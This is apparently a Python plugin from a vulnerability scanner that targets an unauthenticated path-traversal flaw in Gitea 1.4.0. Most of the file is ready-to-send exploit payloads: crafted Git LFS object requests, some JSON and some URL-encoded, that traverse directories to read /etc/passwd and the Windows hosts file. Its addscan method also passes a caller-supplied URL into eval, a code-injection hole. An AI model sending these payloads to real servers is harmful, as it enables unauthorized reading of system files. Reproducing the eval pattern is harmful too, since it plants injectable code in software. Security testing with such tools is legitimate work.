#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Gitea是从gogs衍生出的一个开源项目, 是一个类似于Github、Gitlab的多用户Git仓库管理平台
    Gitea扫描类: 
        Gitea 1.4.0 未授权访问, 综合漏洞(目录穿越, RCE等)
            暂无编号
                Payload: https://vulhub.org/#/environments/gitea/1.4-rce/


file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.Gitea.unauth import unauth_scan

class Gitea():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Gitea'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.unauth_payloads = [
            {
                'path': '.git/info/lfs/objects',
                'data': '''{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.git-lfs+json'
                })
            },
            {
                'path': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd/a',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '.git/info/lfs/objects',
                'data': '''{
    "Oid": "....../../../C:/Windows/System32/drivers/etc/hosts",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.git-lfs+json'
                })
            },
            {
                'path': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2FC:%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts/a',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.gitea_unauthorized_scan, url=url)
        ]

Gitea.gitea_unauthorized_scan = unauth_scan

gitea = Gitea()
